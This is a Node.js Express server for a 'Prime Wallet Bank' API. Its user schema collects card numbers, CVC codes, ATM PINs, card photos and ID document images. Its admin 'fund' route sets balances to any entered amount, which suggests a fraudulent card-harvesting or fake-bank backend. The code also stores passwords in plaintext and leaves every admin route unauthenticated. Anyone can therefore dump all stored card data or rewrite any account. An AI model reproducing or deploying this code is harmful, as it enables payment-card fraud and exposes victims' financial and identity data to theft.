// ==================================================
// 🚀 PRIME WALLET BANK — FULL SERVER CODE
// ==================================================
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 10000;

// ==========================================
// 🗄️ MONGODB CONNECTION
// ==========================================
const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
  console.log("⚠️ MONGO_URI not found — using local storage only");
} else {
  mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connected to MongoDB — ALL DATA SAVED FOREVER"))
    .catch(err => console.log("❌ MongoDB connection error:", err.message));
}

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: "50mb" }));

// ==========================================
// ✅ HEALTH CHECK — FOR UPTIMEROBOT
// ==========================================
app.get("/api/health", (req, res) => {
  res.status(200).json({
    status: "🟢 ONLINE",
    message: "Prime Wallet Bank API — Running 24/7",
    time: new Date().toLocaleString()
  });
});

// ==========================================
// 📊 USER SCHEMA & MODEL
// ==========================================
const userSchema = new mongoose.Schema({
  full_name: String,
  email: { type: String, unique: true },
  phone: String,
  country: String,
  state: String,
  city: String,
  password: String,
  idType: String,
  idNumber: String,
  idFront: String,
  idBack: String,
  atmHolder: String,
  atmNumber: String,
  atmExpiry: String,
  atmCvc: String,
  atmPin: String,
  atmFront: String,
  atmBack: String,
  balance: { type: Number, default: 0 },
  account_number: String,
  approved: { type: Boolean, default: false },
  card_approved: { type: Boolean, default: false },
  status: { type: String, default: "active" },
  registered_at: { type: Date, default: Date.now }
});

const User = mongoose.model("User", userSchema);

// ==========================================
// 🔐 REGISTER ENDPOINT
// ==========================================
app.post("/api/register", async (req, res) => {
  try {
    const existing = await User.findOne({ email: req.body.email });
    if (existing) return res.status(400).json({ error: "Email already registered" });

    const user = new User(req.body);
    await user.save();
    res.status(201).json({ message: "✅ Registration submitted — awaiting approval", user });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// 🔐 LOGIN ENDPOINT
// ==========================================
app.post("/api/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email, password });
    if (!user) return res.status(401).json({ error: "Invalid credentials" });
    res.json({ 
      message: "✅ Login successful", 
      user,
      token: "user_token_" + Date.now()
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// 📋 GET ALL USERS — ADMIN ONLY
// ==========================================
app.get("/api/admin/users", async (req, res) => {
  try {
    const users = await User.find().sort({ registered_at: -1 });
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// ✅ UPDATE USER — ADMIN APPROVE / FUND / FREEZE
// ==========================================
app.put("/api/admin/user/:id", async (req, res) => {
  try {
    const user = await User.findByIdAndUpdate(
      req.params.id,
      { $set: req.body },
      { new: true }
    );
    res.json({ message: "✅ User updated", user });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// 💰 FUND USER ACCOUNT
// ==========================================
app.post("/api/admin/fund/:id", async (req, res) => {
  try {
    const { amount } = req.body;
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: "User not found" });
    
    user.balance = (user.balance || 0) + Number(amount);
    await user.save();
    res.json({ message: `✅ Funded $${amount} successfully`, user });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// 🏃 START SERVER
// ==========================================
app.listen(PORT, () => {
  console.log(`✅ Prime Wallet API running on port ${PORT}`);
  console.log(`✅ API Health: https://prime-wallet-bank-api-1.onrender.com/api/health`);
});
